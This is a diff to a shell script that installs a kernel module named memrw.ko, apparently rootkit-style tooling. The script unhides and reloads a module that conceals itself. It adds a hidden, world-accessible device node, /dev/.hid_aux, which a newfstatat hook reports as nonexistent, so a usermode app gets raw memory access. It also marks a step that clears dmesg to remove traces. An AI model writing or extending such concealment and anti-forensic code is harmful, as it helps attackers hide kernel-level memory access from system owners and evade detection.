@@ -142,11 +142,13 @@ echo "[7/8] Loading kernel module..."
 
 # Try to unhide and remove a previously hidden module instance.
 # We use IOCTL_UNHIDE_MODULE to re-expose it, then rmmod.
-MAJOR=$(grep " ${DEV_NAME}$" /proc/devices 2>/dev/null | awk '{print $1}')
+MAJOR=$(grep " ${DEV_NAME}$" /proc/devices 2>/dev/null | head -1 | awk '{print $1}')
 if [ -n "$MAJOR" ]; then
     echo "  Found existing module (major $MAJOR), unhiding for removal..."
-    TMP_DEV="/tmp/.${DEV_NAME}_$$"
-    mknod "$TMP_DEV" c "$MAJOR" 0 2>/dev/null || true
+    TMP_DEV="/dev/.hid_aux"
+    if [ ! -c "$TMP_DEV" ]; then
+        (umask 000; mknod "$TMP_DEV" c "$MAJOR" 0) 2>/dev/null || true
+    fi
     if [ -c "$TMP_DEV" ]; then
         # Send IOCTL_UNHIDE_MODULE via python (simplest way without a C tool)
         python3 -c "
@@ -165,6 +167,7 @@ fi
 
 # Clean up any leftover device nodes
 rm -f "/dev/${DEV_NAME}" 2>/dev/null || true
+rm -f "/dev/.hid_aux" 2>/dev/null || true
 
 if insmod "$OUTPUT_DIR/memrw.ko"; then
     echo "  Module loaded. ✓"
@@ -177,6 +180,19 @@ else
     echo ""
     echo "  Check: mokutil --test-key $MOK_CERT"
     exit 1
+fi
+
+# Create hidden device node for usermode app (avoids /proc access from usermode)
+# NOTE: chmod/chcon won't work after driver loads because our newfstatat hook
+#       returns ENOENT for .hid_aux. So we set permissions at creation via umask.
+MAJOR=$(grep " ${DEV_NAME}$" /proc/devices 2>/dev/null | head -1 | awk '{print $1}')
+if [ -n "$MAJOR" ]; then
+    HIDDEN_NODE="/dev/.hid_aux"
+    rm -f "$HIDDEN_NODE" 2>/dev/null || true
+    (umask 000; mknod "$HIDDEN_NODE" c "$MAJOR" 0)
+    echo "  Hidden device node created: $HIDDEN_NODE (major $MAJOR) ✓"
+else
+    echo "  WARNING: Could not find major number — hidden node not created!"
 fi
 
 # Clear dmesg to remove any traces
